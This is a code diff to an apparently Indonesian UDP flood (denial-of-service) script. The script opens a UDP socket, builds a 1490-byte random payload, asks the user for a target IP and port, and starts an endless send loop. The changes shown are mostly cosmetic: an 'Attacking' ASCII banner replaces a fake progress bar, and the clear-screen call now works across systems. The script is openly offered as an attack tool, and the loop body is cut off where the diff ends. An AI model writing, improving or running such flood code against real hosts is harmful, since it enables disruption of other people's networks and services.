@@ -17,7 +17,18 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
+attack = """
+          _   _             _    _             
+     /\  | | | |           | |  (_)            
+    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
+   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
+  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
+ /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
+                                          __/ |
+                                         |___/ 
+"""
+
+os.system('cls' if os.name == 'nt' else 'clear')
 print (""" 
     ____  ____       _____    ___   __  __             __  
    / __ \/ __ \____ / ___/   /   | / /_/ /_____ ______/ /__
@@ -33,19 +44,10 @@ print "[+] Telegram    : t.me/Cendawann"
 print "[~] Quote       : It is better to be hated for what you are than to be loved for what you are not."
 print
 ip = raw_input("masukkan IP : ")
-port = input("masukkan PORT       : ")
+port = input("masukkan PORT : ")
 
-os.system("clear")
-os.system("figlet Attackking")
-print "[                    ] 0% "
-time.sleep(3)
-print "[=====               ] 25%"
-time.sleep(3)
-print "[==========          ] 50%"
-time.sleep(3)
-print "[===============     ] 75%"
-time.sleep(3)
-print "[====================] 100%"
+os.system('cls' if os.name == 'nt' else 'clear')
+print(attack)
 time.sleep(2)
 sent = 0
 while True:
